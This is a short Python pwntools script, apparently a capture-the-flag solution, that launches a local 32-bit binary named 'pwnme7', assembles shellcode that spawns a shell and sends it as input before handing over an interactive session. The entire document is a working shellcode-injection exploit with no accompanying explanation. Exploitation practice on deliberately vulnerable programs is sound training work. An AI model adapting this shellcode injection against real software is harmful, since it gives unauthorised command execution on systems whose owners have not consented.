from pwn import *

context.arch = 'i386'
p = process('./pwnme7')

shellcode = asm(shellcraft.sh())

p.sendline(shellcode)
p.interactive()
